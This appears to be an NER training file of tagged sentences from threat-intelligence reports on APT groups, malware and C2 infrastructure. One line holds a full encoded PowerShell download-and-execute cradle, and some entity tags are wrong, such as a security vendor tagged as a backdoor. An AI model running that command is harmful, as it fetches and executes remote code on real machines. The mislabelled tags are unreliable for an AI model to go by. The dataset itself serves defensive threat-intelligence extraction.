phi.crabance[.]com	O
domain	O
resolved	O
to	O
98.126.91.66	B-ip.unknown
.	O

The	O
second	O
trend	O
is	O
towards	O
attacks	O
on	O
the	O
supply	O
chain	O
,	O
compromising	O
organizations	O
with	O
the	O
goal	O
of	O
then	O
attacking	O
the	O
customers	O
,	O
or	O
even	O
the	O
customers	O
of	O
the	O
customers	O
,	O
of	O
those	O
organizations	O
.	O

These	O
URLs	O
can	O
be	O
found	O
hardcoded	O
in	O
the	O
implants	O
'	O
code	O
.	O

In	O
its	O
early	O
attacks	O
,	O
the	O
group	O
's	O
malware	O
payload	O
(	O
with	O
the	O
exception	O
of	O
plugins	O
)	O
was	O
fully	O
contained	O
within	O
an	O
exploit	O
document	O
emailed	O
to	O
the	O
victim	O
.	O

Decoy	O
Document	O
Author	O
:	O

病毒分析	O
(	O
32	O
)	O

char	O
*param	O
;	O

tags	O
.	O

Like	O
the	O
JavaScript	O
from	O
the	O
ATD	O
and	O
DPHK	O
websites	O
,	O
Volexity	B-malware.backdoor
was	O
never	O
actually	O
able	O
to	O
obtain	O
a	O
live	O
copy	O
of	O
this	O
script	O
.	O

/Users/Shared	O
/.local/	O
kextd	O
/Username/Library/Assistants	O
/.local/	O
random_name	O

29	O
Dec	O
.	O

setup35.exe	O
,	O
aka	O
update.exe	O
.	O

2016	O
.	O

Windows	O
users	O
should	O
combine	O
traditional	O
anti-malware	O
technologies	O
with	O
patch	O
management	O
,	O
host	O
intrusion	O
detection	O
and	O
,	O
ideally	O
,	O
whitelisting	O
and	O
default-deny	O
strategies	O
.	O

4	O
.	O

In	O
2015	O
,	O
many	O
of	O
these	O
techniques	O
and	O
activities	O
remain	O
in	O
use	O
.	O

convenes	O
and	O
plans	O
to	O
lay	O
Yanukovych	O
does	O
foundation	O
for	O
EU	O
about	O
face	O
on	O
Association	O
Agreement	O
planned	O
EU	O
agreement	O
,	O
orients	O
towards	O
Russia	O
Protest	O
movement	O
begins	O
in	O
Kiev	O
Protests	O
reach	O
their	O
peak	O
,	O
gov't	O
cracks	O
down	O
violently	O
;	O
agreement	O
reached	O
for	O
elections	O
;	O
Yanukovich	O
flees	O
to	O
Russia	O
DDoS	O
vs	O
.	O

While	O
we	O
have	O
identified	O
and	O
analyzed	O
several	O
droppers	O
for	O
the	O
IRONGATE	B-malware.backdoor
malware	O
,	O
we	O
have	O
yet	O
to	O
identify	O
the	O
code	O
's	O
infection	O
vector	O
.	O

Enterprises	O
can	O
benefit	O
from	O
Trend	O
Micro	O
's	O
Smart	O
Protection	O
Suites	O
with	O
XGenTM	O
security	O
,	O
which	O
infuses	O
high-fidelity	O
machine	O
learning	O
into	O
a	O
blend	O
of	O
threat	O
protection	O
techniques	O
to	O
eliminate	O
security	O
gaps	O
across	O
any	O
user	O
activity	O
and	O
any	O
endpoint	O
.	O

These	O
functions	O
assure	O
malware	O
persistence	O
in	O
a	O
compromised	O
OS	O
between	O
system	O
reboots	O
.	O

Keylogger	O
:	O
Records	O
any	O
keystroke	O
from	O
user	O
activity	O
on	O
the	O
system	O
.	O

A	O
176.56.238.177	B-ip.unknown
download-mgrwin[.]com	B-url.cncsvr
.	O

Below	O
are	O
the	O
various	O
functionalities	O
of	O
RATANKBA	B-malware.backdoor
's	O
controller	O
:	O

Ensuring	O
these	O
are	O
patched	O
with	O
the	O
latest	O
updates	O
greatly	O
reduces	O
the	O
number	O
of	O
exploitable	O
entry	O
points	O
available	O
to	O
an	O
attacker	O
.	O

The	O
malware	O
replaces	O
a	O
Dynamic	O
Link	O
Library	O
(	O
DLL	O
)	O
with	O
a	O
malicious	O
DLL	O
,	O
which	O
then	O
acts	O
as	O
a	O
broker	O
between	O
a	O
PLC	O
and	O
the	O
legitimate	O
monitoring	O
software	O
.	O

egrep	O
-re	O
'	O
[	O
<	O
]	O
[	O
?	O
]	O

Restrict	O
administrative	O
privileges	O
–	O
Threat	O
actors	O
are	O
increasingly	O
focused	O
on	O
gaining	O
control	O
of	O
legitimate	O
credentials	O
,	O
especially	O
those	O
associated	O
with	O
highly	O
privileged	O
accounts	O
.	O

The	O
campaign	O
has	O
been	O
in	O
effect	O
for	O
sometime	O
now	O
.	O

Example	O
initial	O
beacon	O
request	O
:	O

In	O
this	O
instance	O
,	O
we	O
can	O
use	O
the	O
same	O
technique	O
to	O
clean	O
up	O
unnecessary	O
code	O
snippets	O
from	O
our	O
advanced	O
persistent	O
threat	O
(	O
APT	O
)	O
analysis	O
and	O
make	O
a	O
reverse	O
engineer	O
's	O
life	O
easier	O
.	O

•	O
Moving	O
laterally	O
through	O
a	O
network	O
relying	O
only	O
on	O
legitimate	O
tools	O
that	O
already	O
exist	O
within	O
the	O
victims	O
'	O
systems	O
,	O
at	O
times	O
forgoing	O
their	O
traditional	O
toolset	O
for	O
the	O
duration	O
of	O
the	O
compromise	O
.	O

The	O
malicious	O
email	O
attachment	O
exploits	O
some	O
common	O
vulnerabilities	O
in	O
PDF	O
and	O
DOC	O
files	O
.	O

Figure	O
9	O

FANCY	O
BEAR	O
has	O
also	O
been	O
linked	O
publicly	O
to	O
intrusions	O
into	O
the	O
German	O
Bundestag	O
and	O
France	O
's	O
TV5	O
Monde	O
TV	O
station	O
in	O
April	O
2015	O
.	O

What	O
follows	O
is	O
a	O
brief	O
description	O
of	O
what	O
the	O
sample	O
of	O
the	O
Shamoon	B-malware.unknown
malware	O
does	O
and	O
a	O
description	O
and	O
results	O
of	O
researchers	O
'	O
file	O
system	O
recovery	O
efforts	O
.	O

The	O
highest	O
number	O
of	O
connections	O
to	O
this	O
sinkhole	O
was	O
on	O
Dec	O
.	O

The	O
prototype	O
for	O
PCC_SOCK	O
appears	O
in	O
Figure	O
1	O
.	O

During	O
this	O
process	O
the	O
malware	O
may	O
need	O
higher	O
privileges	O
(	O
e.g.	O
root	O
)	O
and	O
further	O
exploits	O
will	O
be	O
utilized	O
.	O

The	O
newly	O
added	O
variables	O
include	O
:	O
colorDepth	O
–	O
This	O
may	O
help	O
to	O
identify	O
virtual	O
machines	O
which	O
are	O
typically	O
configured	O
with	O
specific	O
graphics	O
options	O
.	O

Additionally	O
we	O
'd	O
like	O
to	O
thank	O
David	O
Greene	O
,	O
Jamie	O
Lee	O
Williams	O
,	O
Meghan	O
Fenzel	O
,	O
Nate	O
Cardozo	O
,	O
Kurt	O
Opsahl	O
,	O
Soraya	O
Okuda	O
,	O
and	O
Marion	O
Marschalek	O
,	O
for	O
their	O
patience	O
,	O
help	O
,	O
support	O
,	O
and	O
advice	O
.	O

TShehab	O
[	O
RTLO	O
]	O
cod.scr	O
'	O
Found	O
in	O
Israel	O

Tools	O

In	O
our	O
previous	O
entry	O
on	O
ScanBox	B-malware.infosteal
we	O
described	O
four	O
clusters	O
of	O
activity	O
–	O
this	O
section	O
includes	O
updates	O
on	O
those	O
clusters	O
.	O

This	O
other	O
file	O
contacts	O
another	O
command	O
and	O
control	O
'	O
46.183.218.37	B-ip.unknown
'	O
,	O
located	O
in	O
Latvia	O
:	O

Ltd	O
.	O

In	O
early	O
May	O
,	O
the	O
phishing	O
lures	B-malware.infosteal
leveraged	O
RTF	O
attachments	O
that	O
exploited	O
the	O
Microsoft	O
Windows	O
vulnerability	O
described	O
in	O
CVE	O
2017-0199	O
.	O

Special	O
thanks	O
to	O
Josh	O
Phillips	O
of	O
the	O
CrowdStrike	O
Global	O
Intelligence	O
Team	O
for	O
providing	O
the	O
technical	O
analysis	O
in	O
this	O
blog	O
post	O
.	O

As	O
mentioned	O
before	O
this	O
was	O
to	O
be	O
expected	O
as	O
the	O
malware	O
tries	O
to	O
wipe	O
mounted	O
and	O
other	O
volumes	O
first	O
and	O
will	O
then	O
move	O
to	O
the	O
primary	O
volume	O
(	O
1/C	O
)	O
.	O

As	O
noted	O
above	O
,	O
some	O
variants	O
also	O
use	O
disguised	O
folders	O
and	O
shortcuts	O
and	O
do	O
not	O
use	O
exploits	O
to	O
run	O
their	O
code	O
.	O

The	O
technical/forensic	O
evidence	O
to	O
link	O
the	O
Lazarus	O
group	O
actors	O
(	O
who	O
we	O
believe	O
are	O
behind	O
the	O
Bangladesh	O
Bank	O
attack	O
and	O
many	O
others	O
in	O
2016	O
)	O
to	O
the	O
watering-hole	O
activity	O
is	O
unclear	O
.	O

At	O
other	O
times	O
large	O
banks	O
and	O
private	O
corporations	O
have	O
been	O
hit	O
hard	O
by	O
Sofacy	O
exploits	O
,	O
at	O
a	O
cost	O
of	O
hundreds	O
of	O
millions	O
to	O
the	O
victims	O
.	O

hosted	O
on	O
the	O
Japanese	O
IP	O
address	O
211.125.81.203.7506	B-ip.unknown
|	O
211.125.80.0/22	B-ip.unknown
|	O
INTERQ	O
|	O
JP	O
|	O
GMO.JP	O
|	O
GMO	O
INTERNET	O
INC	O
.	O

After	O
the	O
bait	O
DOC	O
file	O
is	O
executed	O
,	O
it	O
will	O
start	O
to	O
execute	O
the	O
Powershell	O
command	O
to	O
the	O
next	O
step	O
payload	O
.	O

As	O
part	O
of	O
its	O
research	O
,	O
ICEBRG	O
coordinates	O
disclosure	O
of	O
security	O
threats	O
and	O
vulnerabilities	O
with	O
relevant	O
parties	O
in	O
order	O
to	O
maximize	O
both	O
the	O
response	O
and	O
victim	O
remediation	O
efforts	O
as	O
well	O
as	O
working	O
to	O
truly	O
improve	O
the	O
security	O
of	O
customers	O
and	O
other	O
victims	O
prior	O
to	O
publishing	O
blog	O
posts	O
.	O

If	O
this	O
is	O
not	O
the	O
case	O
,	O
we	O
invite	O
Gamma	O
International	O
to	O
explain	O
.	O

The	O
BBC	O
.	O

Five	O
seconds	O
after	O
loading	O
,	O
the	O
malicious	O
Step7ProSim.dll	O
records	O
five	O
seconds	O
of	O
calls	O
to	O
ReadDataBlockValue	O
.	O

9/12	O

Figure	O
19	O
.	O

2016	O
.	O

We	O
also	O
observed	O
a	O
similar	O
evasion	O
technique	O
within	O
the	O
'	O
Sysget/HelloBridge	B-malware.backdoor
'	O
payload	O

A	O
quick	O
search	O
on	O
the	O
internet	O
confirmed	O
this	O
so	O
I	O
added	O
a	O
soundcard	O
to	O
my	O
VM	O
.	O

Description	O
Sample	O
value	O
(	O
referring	O
to	O
sample	O
packet	O
illustrated	O
below	O
)	O

For	O
the	O
attackers	O
,	O
this	O
is	O
certainly	O
a	O
big	O
failure	O
.	O

Sysinfo	O
:	O
returns	O
detailed	O
information	O
on	O
the	O
computer	O
(	O
pretty	O
much	O
the	O
output	O
of	O
systeminfo	O
)	O
;	O
the	O
bot	O
will	O
respond	O
with	O
a	O
message	O
with	O
the	O
header	O
$	O
sysinfo	O
$	O
.	O

Its	O
major	O
duties	O
are	O
:	O
establishing	O
North	O
Korea	O
Policy	O
,	O
coordinating	O
inter-Korean	O
dialogue	O
,	O
pursuing	O
inter-Korean	O
cooperation	O
and	O
educating	O
the	O
public	O
on	O
unification	O
.	O

T	O
he	O
main	O
C2	O
used	O
in	O
this	O
campaign	O
is	O
bbs.sonypsps[.]com	B-url.unknown
,	O
which	O
resolved	O
to	O
IP-address	O
,	O
that	O
belongs	O
to	O
the	O
Ukrainian	O
ISP	O
network	O
,	O
held	O
by	O
a	O
Mikrotik	O
router	O
using	O
firmware	O
version	O
6.34.4	O
(	O
from	O
March	O
2016	O
)	O
with	O
SMBv1	O
on	O
board	O
.	O

We	O
have	O
uncovered	O
a	O
substantial	O
number	O
of	O
malware	O
executables	O
that	O
contain	O
information	O
seemingly	O
tailored	O
at	O
Israelis	O
and	O
Palestinians	O
.	O

Looking	O
further	O
,	O
we	O
identified	O
some	O
other	O
candidate	O
strings	O
which	O
,	O
although	O
not	O
unique	O
,	O
when	O
combined	O
together	O
allow	O
us	O
to	O
fingerprint	O
the	O
binaries	O
from	O
our	O
case	O
in	O
a	O
more	O
precise	O
way	O
.	O

SELECT	O
SerialNumber	O
FROM	O
Win32_BaseBoard	O

In	O
this	O
instance	O
,	O
it	O
is	O
attempting	O
to	O
look	O
like	O
a	O
certificate	O
generation	O
tool	O
.	O

Results	O
from	O
commands	O
will	O
be	O
sent	O
back	O
encoded	O
to	O
the	O
server	O
to	O
the	O
'	O
result.asp	O
'	O
page	O
.	O

loveusd.sys	O
.	O

Every	O
time	O
the	O
vcmon.exe	O
is	O
executed	O
,	O
it	O
disables	O
AhnLab	O
's	O
firewall	O
by	O
zeroing	O
out	O
following	O
registry	O
values	O
:	O

These	O
attempts	O
at	O
exploitation	O
,	O
compromise	O
,	O
and	O
digital	O
surveillance	O
are	O
detailed	O
throughout	O
this	O
post	O
.	O

Exploit	O
code	O
analyzed	O
by	O
HBGary	O
reveals	O
that	O
only	O
Internet	O
Explorer	O
6	O
was	O
targeted	O
during	O
Operation	B-malware.infosteal
Aurora	I-malware.infosteal
.	O

Here	O
is	O
a	O
list	O
of	O
Domains	O
organized	O
by	O
port	O
.	O

Germany	O
's	O
Christian	O
Democratic	O
Union	O
(	O
CDU	O
)	O
APRIL	O
-	O
MAY	O
2016	O
Researchers	O
at	O
Trend	O
Micro	O
observed	O
APT28	B-malware.infosteal
establish	O
a	O
fake	O
CDU	O
email	O
server	O
and	O
launch	O
phishing	O
emails	O
against	O
CDU	O
members	O
in	O
an	O
attempt	O
to	O
obtain	O
their	O
email	O
credentials	O
and	O
access	O
their	O
accounts	O
.	O

The	O
Professional	O
Commons	O
â	O
€	O
'	O
Hong	O
Kong	O

Thus	O
,	O
the	O
'	O
Last	O
Saved	O
By	O
'	O
properties	O
of	O
the	O
documents	O
contained	O
his	O
username	O
:	O

Fig	O
.	O

'	O
Guccifer	O
2.0	O
Drops	O
More	O
DNC	O
Docs	O
.	O
'	O

Second	O
,	O
Siemens	O
ProductCERT	O
informed	O
us	O
that	O
scada.exe	B-malware.unknown
is	O
not	O
a	O
default	O
file	O
name	O
associated	O
with	O
Siemens	O
industrial	O
control	O
software	O
.	O

The	O
Figures	O
13	O
and	O
14	O
below	O
shows	O
data	O
before	O
and	O
after	O
a	O
bitwise	O
NOT	O
operation	O
.	O

Shamoon	B-malware.unknown
Wiper	I-malware.unknown
Functionality	O
Actions	O
:	O
Executes	O
a	O
copy	O
of	O
itself	O
as	O
a	O
scheduled	O
job	O
Deletes	O
the	O
file	O
created	O
for	O
the	O
scheduled	O
job	O
Entrenches	O
itself	O
as	O
a	O
service	O
Execution	O
of	O
the	O
entrenched	O
file	O
results	O
in	O
a	O
dropped	O
driver	O
The	O
dropped	O
driver	O
is	O
loaded	O
and	O
executed	O
The	O
dropped	O
driver	O
facilitates	O
disk	O
access	O
The	O
malware	O
overwrites	O
disk	O
data	O
to	O
include	O
the	O
contents	O
of	O
\\Documents	O
and	O
Settings	O
(	O
user	O
data	O
)	O
and	O
\\Windows\system32	O
(	O
system	O
data	O
)	O
directories	O
The	O
malware	O
eventually	O
overwrites	O
the	O
disk	O
's	O
boot	O
records	O
(	O
Master	O
Boot	O
Record	O
(	O
MBR	O
)	O
and	O
Volume	O
Boot	O
Record	O
(	O
VBR	O
)	O
)	O
(	O
Note	O
:	O
Testing	O
was	O
accomplished	O
on	O
disks	O
with	O
one	O
partition	O
)	O
The	O
malware	O
appears	O
to	O
target	O
user	O
data	O
first	O
,	O
then	O
system	O
data	O
The	O
nature	O
of	O
the	O
overwrites	O
is	O
such	O
that	O
the	O
malware	O
writes	O
only	O
a	O
certain	O
amount	O
of	O
data	O
to	O
targeted	O
files	O
,	O
starting	O
at	O
the	O
files	O
'	O
beginning	O
(	O
Offset	O
0x0	O
)	O
and	O
then	O
writing	O
a	O
certain	O
amount	O
of	O
data	O
to	O
other	O
file	O
locations	O
Fidelis	O
researcher	O
observations	O
included	O
the	O
following	O
:	O
At	O
some	O
point	O
during	O
the	O
writing	O
(	O
wiping	O
)	O
process	O
,	O
the	O
targeted	O
system	O
tries	O
to	O
read	O
file	O
data	O
that	O
has	O
been	O
overwritten	O
,	O
prompting	O
an	O
attempt	O
to	O
restore	O
the	O
involved	O
file	O
The	O
system	O
asks	O
the	O
user	O
for	O
media	O
containing	O
system	O
files	O
when	O
it	O
can	O
not	O
find	O
The	O
targeted	O
system	O
eventually	O
reboots	O
,	O
resulting	O
an	O
error	O
on	O
restart	O
because	O
of	O
the	O
system	O
files	O
it	O
is	O
looking	O
for	O
the	O
overwritten	O
boot	O
records	O
The	O
disks	O
targeted	O
in	O
testing	O
were	O
not	O
completely	O
overwritten	O
;	O
there	O
was	O
still	O
apparently	O
viable	O
file	O
data	O
on	O
the	O
targeted	O
disks	O
The	O
result	O
of	O
the	O
malware	O
's	O
operation	O
was	O
the	O
prevention	O
of	O
accessing	O
the	O
targeted	O
file	O
system	O

In	O
both	O
the	O
cases	O
when	O
the	O
victims	O
opens	O
the	O
attached	O
malicious	O
excel	O
file	O
the	O
same	O
malware	O
sample	O
was	O
dropped	O
and	O
executed	O
on	O
the	O
victim	O
's	O
system	O
.	O

2/10/2017	O
In	O
my	O
previous	O
blog	O
posts	O
I	O
described	O
attack	O
campaigns	O
targeting	O
Indian	O
government	O
organizations	O
,	O
and	O
Indian	O
Embassies	O
and	O
Ministry	O
of	O
External	O
affairs	O
.	O

It	O
gained	O
some	O
notoriety	O
in	O
connection	O
with	O
attacks	O
against	O
Syrian	O
activists	O
;	O
along	O
with	O
other	O
off-the-shelf	O
trojans	O
such	O
as	O
BlackShades	B-malware.backdoor
and	O
DarkComet	B-malware.backdoor
.	O

ComServer1	O
:	O
hXXp://www.rsvniima.org/	O
...	O
[	O
]	O
...	O
/din12/postal.php	O
STR	O

T	O
he	O
patched	O
code	O
jumps	O
back	O
to	O
the	O
decryptor	O
's	O
second	O
shikata_	O
ga_	O
nai	O
iteration	O
,	O
but	O
this	O
time	O
as	O
part	O
of	O
the	O
whitelisted	O
application	O
.	O

One	O
such	O
email	O
that	O
we	O
were	O
able	O
to	O
obtain	O
was	O
targeting	O
users	O
in	O
Turkey	O
,	O
as	O
shown	O
in	O
Figure	O
4	O
:	O
The	O
malicious	O
Microsoft	O
Office	O
attachments	O
that	O
we	O
observed	O
appear	O
to	O
have	O
been	O
specially	O
crafted	O
for	O
individuals	O
in	O
four	O
countries	O
:	O
Turkey	O
,	O
Pakistan	O
,	O
Tajikistan	O
and	O
India	O
.	O

The	O
configuration	O
file	O
contains	O
a	O
list	O
of	O
transaction	O
IDs	O
,	O
some	O
additional	O
environment	O
information	O
,	O
and	O
the	O
following	O
IP	O
address	O
to	O
be	O
used	O
for	O
command-and-control	O
(	O
C	O
&	O
C	O
)	O
:	O

To	O
learn	O
more	O
about	O
how	O
FireEye	O
can	O
help	O
your	O
organization	O
find	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
and	O
other	O
advanced	O
malware	O
,	O
visit	O
www.fireeye.com	B-url.normal
.	O

error	O
=	O
3	O
'	O
!	O
add	O
drive	O
,	O
n	O
=	O
5	O
'	O
(	O
5	O
represents	O
E	O
drive	O
)	O
<	O
8	O
hex	O
digits	O
>	O
ar	O
<	O
date	O
>	O
<	O
time	O
>	O
'	O
!	O
ad	O
dri	O
,	O
nD=5	O
'	O
Indicates	O
failure	O
to	O
open	O
desktop.ini	O
for	O
writing	O
Specifies	O
error	O
code	O
for	O
failure	O
to	O
open	O
desktop.ini	O
for	O
writing	O
Indicates	O
failure	O
to	O
create	O
the	O
RECYLCED/RECYCLER	O
directory	O
.	O

Management	O
and	O
executive	O
leadership	O
may	O
use	O
this	O
information	O
to	O
assess	O
the	O
risks	O
associated	O
with	O
the	O
threat	O
described	O
herein	O
to	O
make	O
operational	O
and	O
policy	O
decisions	O
accordingly	O
.	O

The	O
following	O
script	O
can	O
be	O
identi ed	O
as	O
generated	O
by	O
Invoke-PSImage	O
to	O
execute	O
the	O
attacker	O
's	O
implant	O
in	O
an	O
image	O
from	O
a	O
remote	O
server	O
.	O

In	O
a	O
majority	O
of	O
the	O
cases	O
,	O
threat	O
actors	O
using	O
the	O
Cmstar	B-malware.unknown
downloader	O
initially	O
register	O
the	O
C2	O
domains	O
using	O
the	O
email	O
address	O
'	O
WANGMINGHUA6@GMAIL[.]COM	B-url.unknown
'	O
and	O
later	O
change	O
the	O
registration	O
information	O
to	O
include	O
a	O
different	O
email	O
address	O
.	O

Below	O
are	O
examples	O
of	O
lure	O
documents	O
presented	O
to	O
the	O
victim	O
while	O
the	O
malware	O
infects	O
the	O
computer	O
.	O

Salle	O
de	O
presse	O
virtuelle	O
Kaspersky	O
Lab	O
:	O
http://newsroom.kaspersky.eu/fr/	B-url.normal

Our	O
investigation	O
of	O
APT28	B-malware.infosteal
's	O
compromise	O
of	O
WADA	O
's	O
network	O
,	O
and	O
our	O
observations	O
of	O
the	O
surrounding	O
events	O
reveal	O
how	O
Russia	O
sought	O
to	O
counteract	O
a	O
damaging	O
narrative	O
and	O
delegitimize	O
the	O
institutions	O
leveling	O
criticism	O
.	O

powershell.exe	O
-nop	O
–w	O
hidden	O
-exec	O
bypass	O
-enc	O
'	O
JAAyAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGUAeABlAGMAIABiAHkAcABhAHMAcwAgAC0AYwAgACIASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAJwBoAHQAdABwAHMAOgAvAC8AZwBvAG8ALgBnAGwALwBjAHAAVAAxAE4AVwAnACcAKQAiACcAOwBpAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFMAaQB6AGUAIAAtAGUAcQAgADgAKQB7ACQAMwAgAD0AIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAAgACsAIAAiAFwAcwB5AHMAdwBvAHcANgA0AFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwAIgA7AGkAZQB4ACAAIgAmACAAJAAzACAAJAAyACIAOwB9AGUAbABzAGUAewBpAGUAeAAgACIAJgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAkADIAIgA7AH0A	O

In	O
the	O
case	O
of	O
the	O
sample	O
discussed	O
in	O
the	O
introduction	O
we	O
can	O
see	O
:	O
Pomf.se	O
is	O
a	O
relatively	O
low­profile	O
file	O
sharing/hosting	O
website	O
currently	O
based	O
in	O
Sweden	O
.	O

Dynamic	O
DNS	O
Domains	O
:	O

Organizations	O
with	O
high	O
financial	O
or	O
intellectual	O
property	O
value	O
should	O
take	O
the	O
time	O
to	O
ensure	O
their	O
security	O
requirements	O
are	O
met	O
and	O
that	O
employee	O
's	O
are	O
educated	O
about	O
the	O
security	O
threats	O
their	O
organizations	O
face	O
.	O

C2	O
IP	O
Addresses	O

In	O
case	O
the	O
entry	O
is	O
removed	O
,	O
the	O
malware	O
will	O
create	O
a	O
new	O
one	O
.	O

http://pwc.blogs.com/files/tactical-intelligence-bulletin---sofacy-phishing.pdf	B-url.normal

Embedded	O
XOR	O
encrypted	O
data	O
in	O
POST	O
stub	O

5	O

[	O
dw	O
:	O
unknown	O
]	O
[	O
dw	O
:	O
unknown	O
]	O
[	O
dw	O
:	O
command	O
number	O
]	O
[	O
dw	O
:	O
size	O
of	O
data	O
]	O
[	O
dw	O
:	O
unknown	O
]	O
[	O
dw	O
:	O
data	O
]	O

Subsequently	O
,	O
it	O
calls	O
the	O
FreeLibrary	O
function	O
to	O
free	O
its	O
own	O
DLL	O
buffer	O
located	O
at	O
its	O
original	O
address	O
.	O

Duqu	B-malware.infosteal

A	O
2013	O
report	O
by	O
the	O
cybersecurity	O
firm	O
Norman	O
Shark	O
,	O
titled	O
'	O
Operation	O
Hangover	O
:	O
Unveiling	O
an	O
Indian	O
Cyberattack	O
Infrastructure	O
'	O
,	O
describes	O
multiple	O
campaigns	O
linked	O
to	O
this	O
actor	O
.	O

Traces	O
were	O
left	O
on	O
infected	O
systems	O
and	O
abused	O
email	O
accounts	O
.	O

New	O
Findings	O
:	O

Dropper	O

KIDA	O
's	O
mission	O
is	O
to	O
contribute	O
to	O
rational	O
defense	O
policy-making	O
through	O
intensive	O
and	O
systematic	O
research	O
and	O
analysis	O
of	O
defense	O
issues	O
.	O

If	O
the	O
infection	O
ID	O
does	O
not	O
exist	O
within	O
the	O
registry	O
,	O
the	O
server	O
variant	O
will	O
attempt	O
to	O
load	O
the	O
configuration	O
from	O
an	O
encoded	O
buffer	O
located	O
immediately	O
after	O
the	O
static	O
string	O

Below	O
screen	O
shot	O
shows	O
the	O
response	O
given	O
to	O
the	O
malware	O
.	O

T	O
he	O
tools	O
found	O
in	O
this	O
campaign	O
,	O
such	O
as	O
the	O
HyperBro	B-malware.backdoor
T	O
rojan	O
,	O
are	O
regularly	O
used	O
by	O
a	O
variety	O
of	O
Chinese-speaking	O
actors	O
.	O

Troj/Agent-AMEY	B-malware.unknown
that	O
was	O
identified	O
on	O
March	O
25	O
2015	O
by	O
Sophos	O
.	O

All	O
financial	O
institutions	O
who	O
run	O
SWIFT	O
Alliance	O
Access	O
and	O
similar	O
systems	O
should	O
be	O
seriously	O
reviewing	O
their	O
security	O
now	O
to	O
make	O
sure	O
they	O
too	O
are	O
not	O
exposed	O
.	O

However	O
,	O
useful	O
indicators	O
can	O
be	O
extracted	O
from	O
these	O
ubiquitous	B-malware.backdoor
RATs	I-malware.backdoor
to	O
track	O
the	O
activities	O
of	O
targeted	O
threat	O
actors	O
(	O
as	O
well	O
as	O
cybercrime	O
)	O
.	O

Once	O
the	O
temporary	O
file	O
with	O
the	O
SQL	O
statements	O
is	O
constructed	O
,	O
it	O
is	O
executed	O
from	O
a	O
shell	O
script	O
with	O
'	O
sysdba	O
'	O

Windows	O
API	O
.	O

The	O
attack	O
group	O
'	O
DragonOK	B-malware.infosteal
'	O
(	O
named	O
after	O
an	O
event	O
name	O
in	O
one	O
of	O
their	O
payload	O
executables	O
6	O
)	O
appears	O
to	O
operate	O
out	O
of	O
the	O
Jiangsu	O
province	O
in	O
China	O
,	O
and	O
is	O
known	O
to	O
target	O
high-tech	O
and	O
manufacturing	O
companies	O
in	O
Japan	O
and	O
Taiwan	O
.	O

At	O
this	O
point	O
all	O
the	O
components	O
(	O
macro	O
code	O
and	O
the	O
UserForm	O
content	O
)	O
required	O
for	O
analysis	O
was	O
extracted	O
and	O
an	O
environment	O
similar	O
to	O
the	O
original	O
excel	O
file	O
was	O
created	O
to	O
debug	O
the	O
malicious	O
macro	O
.	O

The	O
code	O
from	O
the	O
website	O
can	O
be	O
seen	O
in	O
the	O
screen	O
shot	O
below	O
.	O

The	O
last	O
code	O
block	O
performs	O
the	O
actual	O
swapping	O
,	O
using	O
swap_temp_var_15	O
as	O
the	O
temporary	O
variable	O
to	O
do	O
the	O
swap	O
.	O

By	O
moving	O
two	O
steps	O
up	O
the	O
supply	O
chain	O
the	O
attackers	O
could	O
potentially	O
have	O
carried	O
out	O
surveillance	O
on	O
a	O
vast	O
pool	O
of	O
end-users	O
.	O

Within	O
the	O
main	O
server	O
variant	O
function	O
(	O
dubbed	O
mainThread	O
)	O
,	O
the	O
server	O
variant	O
loads	O
a	O
pointer	O
to	O
the	O
API	O
function	O
GetCommandLineW	O
,	O
locates	O
the	O
pointer	O
in	O
memory	O
to	O
the	O
command	O
line	O
string	O
,	O
and	O
then	O
locates	O
the	O
first	O
space	O
within	O
the	O
command	O
line	O
string	O
and	O
terminates	O
the	O
string	O
by	O
placing	O
a	O
NULL	O
character	O
at	O
the	O
location	O
.	O

The	O
targeting	O
of	O
critical	O
infrastructure	O
as	O
well	O
as	O
the	O
attacker	O
's	O
persistence	O
,	O
lack	O
of	O
any	O
clear	O
monetary	O
goal	O
and	O
the	O
technical	O
resources	O
necessary	O
to	O
create	O
the	O
attack	O
framework	O
suggest	O
a	O
well-resourced	O
nation	O
state	O
actor	O
.	O

According	O
to	O
the	O
Siemens	O
ProductCERT	O
,	O
Step7ProSim.dll	O
is	O
not	O
part	O
of	O
the	O
Siemens	O
PLCSIM	O
software	O
.	O

Contents	O
of	O
SFX	O
archive	O
containing	O
XtremeRAT	B-malware.backdoor
Figure	O
2	O
.	O

This	O
approach	O
was	O
developed	O
by	O
root9B	O
in	O
order	O
to	O
leverage	O
previously	O
existing	O
security	O
products	O
with	O
client-specific	O
threat	O
intelligence	O
and	O
proprietary	O
capabilities	O
that	O
can	O
identify	O
generate	O
actionable	O
intelligence	O
,	O
and	O
install	O
solutions	O
with	O
much	O
greater	O
speed	O
and	O
efficiency	O
.	O

During	O
this	O
testing	O
period	O
,	O
all	O
the	O
samples	O
were	O
uploaded	O
from	O
Pakistan	O
to	O
VirusTotal	O
.	O

In	O
the	O
process	O
of	O
tracing	O
victims	O
,	O
we	O
found	O
one	O
special	O
compromised	O
machine	O
.	O

After	O
the	O
vulnerability	O
was	O
properly	O
resolved	O
,	O
we	O
published	O
this	O
report	O
on	O
May	O
9th	O
,	O
along	O
with	O
further	O
technical	O
disclosure	O
of	O
the	O
attack	O
and	O
the	O
0day	O
.	O

The	O
commands	O
are	O
pretty	O
obvious	O
since	O
its	O
strings	O
are	O
not	O
encrypted	O
after	O
decoding	O
the	O
data	O
.	O

The	O
Cmstar	B-malware.unknown
downloader	O
itself	O
has	O
several	O
unique	O
and	O
interesting	O
features	O
,	O
as	O
well	O
as	O
substantial	O
infrastructure	O
overlap	O
with	O
other	O
tools	O
worth	O
discussing	O
.	O

By	O
the	O
middle	O
of	O
2015	O
it	O
was	O
possible	O
to	O
identify	O
that	O
throughout	O
this	O
period	O
of	O
time	O
it	O
's	O
been	O
the	O
same	O
threat	O
actor	O
,	O
which	O
we	O
call	O
Poseidon	B-malware.infosteal
Group	O
.	O

